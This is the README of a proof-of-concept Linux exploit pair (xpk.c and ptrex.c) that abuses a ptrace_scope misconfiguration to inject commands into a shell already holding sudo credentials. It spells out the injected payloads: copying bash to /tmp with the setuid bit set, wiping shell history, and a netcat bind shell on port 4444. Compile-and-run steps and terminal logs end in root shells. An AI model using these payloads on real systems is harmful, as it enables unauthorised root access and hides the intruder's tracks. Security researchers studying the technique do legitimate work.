# ptrace misconfiguration local privilege escalation
ptrace misconfiguration Local Privilege Escalation

WARNING! this is a POC, the code is CRAP

video demo on youtube: https://youtu.be/3Qmy1Y8W7A8

Injecting code via ptrace (with same user) in shells with sudo authenticated

Exploit Reqs:
* ptrace enable to attach the processes of the user
* terminal with a sudo user group (attacker)
* terminal with the same user & sudo authenticated (victim)
* run xpk or ptrex 

WARNING: if GDB is installed in the machine is more safe run https://www.exploit-db.com/exploits/46989

'ptrace_scope' misconfiguration Local Privilege Escalation by Marcelo Vazquez (s4vitar) & Victor Lasa (vowkin)

my code is based in the s4vitar & vowkin POC and use ptrace (no GDB dep).

I made two POC-flavours for the same thing xpk.c & ptrex.c

## xpk.c
stdin hijack (using ptrace_do lib https://github.com/emptymonkey/ptrace_do): sudo -S cp /bin/bash /tmp + sudo -S chmod +s /tmp/bash + history -c 
```
gcc -o xpk xpk.c
./xpk
```

WARNING: only works for x86_64 systems (ptrace_do limitation)

* can inject code from x86_64-xpk-compiled to x86_64 process
* can inject code from x86_64-xpk-compiled to x86 process

## ptrex.c:
shellcode injection (using ptrace) execve(python -c import os; os.system("echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1")); 
```
gcc -o ptrex ptrex.c
 ./ptrex 
```

You can also inject your own python code: 

./ptrex full_python_path newcmdline

Example with 
* own python binary (limit 150 bytes): /home/dreg/tmp/python
* bind bash shell python code (limit 250 bytes) : import os; os.system("/usr/bin/sudo /bin/nc -lvp 4444 -e /bin/bash")
```
./ptrex /home/dreg/tmp/python 'import os; os.system("/usr/bin/sudo /bin/nc -lvp 4444 -e /bin/bash")'
```

* works for x86_64 systems & x86 systems
* can inject code from x86_64-ptrex-compiled to x86_64 process
* can inject code from x86-ptrex-compiled to x86 process
* can inject code from x86_64-ptrex-compiled to x86 process

WARNING: inject code from x86-ptrex-compiled to x86_x64 process is not possible

## How to test xpk.c:
Open a terminal with a sudo user group

execute any command with sudo and enter the password, ex:
```
dreg@fr33project:~$ tty
/dev/pts/4
dreg@fr33project:~$ id
uid=1003(dreg) gid=1003(dreg) groups=1003(dreg),27(sudo)
dreg@fr33project:~$ sudo whoami
[sudo] password for dreg:
root
dreg@fr33project:~$ 
```

open other terminal with the same user and execute ./xpk (the name of the exploit executable is important, dont change!)
```
dreg@fr33project:~$ tty
/dev/pts/7
dreg@fr33project:~$ .gcc -o xpk xpk.c
dreg@fr33project:~$ ./xpk
David Reguera Garcia aka Dreg exploit without gdb dep, based in:
https://www.exploit-db.com/exploits/46989
'ptrace_scope' misconfiguration Local Privilege Escalation
Authors: Marcelo Vazquez  (s4vitar)
         Victor Lasa       (vowkin)

[*] PID -> bash
[*] Path 2660: /home/dreg
stdin fd: 4
echo "clear && echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1 | echo && history -c && clear" >> /tmp/crap
[*] PID -> bash
[*] Path 2892: /home/dreg
stdin fd: 4
echo "clear && echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1 | echo && history -c && clear" >> /tmp/crap
[*] PID -> sh
[*] Path 2998: /home/dreg
stdin fd: 4
echo "clear && echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1 | echo && history -c && clear" >> /tmp/crap
[*] PID -> bash
[*] Path 2999: /home/dreg
stdin fd: 4
echo "clear && echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1 | echo && history -c && clear" >> /tmp/crap

[*] Cleaning up...
[*] Spawning root shell...
bash-5.0# id
uid=1003(dreg) gid=1003(dreg) euid=0(root) egid=0(root) groups=0(root),27(sudo),1003(dreg)
bash-5.0# whoami
root
bash-5.0#
```

## How to test ptrex.c:
Open a terminal with a sudo user group

execute any command with sudo and enter the password, ex:
```
dreg@fr33project:~$ tty
/dev/pts/4
dreg@fr33project:~$ id
uid=1003(dreg) gid=1003(dreg) groups=1003(dreg),27(sudo)
dreg@fr33project:~$ sudo whoami
[sudo] password for dreg:
root
dreg@fr33project:~$ 
```

open other terminal with the same user and execute ./ptrex
```
dreg@fr33project:~$ tty
/dev/pts/7
dreg@fr33project:~$ .gcc -o ptrex ptrex.c
dreg@fr33project:~$ ./ptrex
ptrex v0.3-beta - MIT License - Copyright 2020
David Reguera Garcia aka Dreg - dreg@fr33project.org
http://github.com/David-Reguera-Garcia-Dreg/ - http://www.fr33project.org/
-
ptrace misconfiguration Local Privilege Escalation
using ptrace (no GDB dep) execve
-
Based from: https://www.exploit-db.com/exploits/46989
'ptrace_scope' misconfiguration Local Privilege Escalation by Marcelo Vazquez (s4vitar) & Victor Lasa (vowkin)

To change default python path & cmd injected: ./ptrex full_python_path newcmdline
    example: ./ptrex /home/dreg/tmp/python 'import os; os.system("/usr/bin/sudo /bin/nc -lvp 4444 -e /bin/bash")'

/proc/sys/kernel/yama/ptrace_scope : 0
pgrep "^(echo $(cat /etc/shells | tr '/' ' ' | awk 'NF{print $NF}' | tr '\n' '|'))$" -u "$(id -u)" | sed '$ d'
current pid: 18888
skipping current shell pid: 18888
current pid: 20156
elf plat: 64
waiting for process
getting registers
injecting shellcode at: 0x00007f33a88890e9
setting instruction pointer to: 0x00007f33a88890e9
runing
please wait...
found suid shell: /tmp/bash
rooting.....
/tmp/bash -p -c 'rm /tmp/bash ; tput cnorm && /bin/bash -p'

bash-5.0# whoami
root
bash-5.0#
```
## WORKING ON:

* Parrot Home/Workstation: 4.6 
* Parrot Security: 4.6 
*	CentOS / RedHat: 7.6 
*	Kali Linux: 2018.4 
* Debian GNU/Linux: 10 (buster)

## CONTRIBUTORS

nobody loves me

## TODO

*  Research why GDB call system("") is more stable and safe. ptrex needs the "python -c" thing for a safe execve injection **in a bash shell** (in other processes I can inject any execve(cmd) without problems, no idea why this happens).

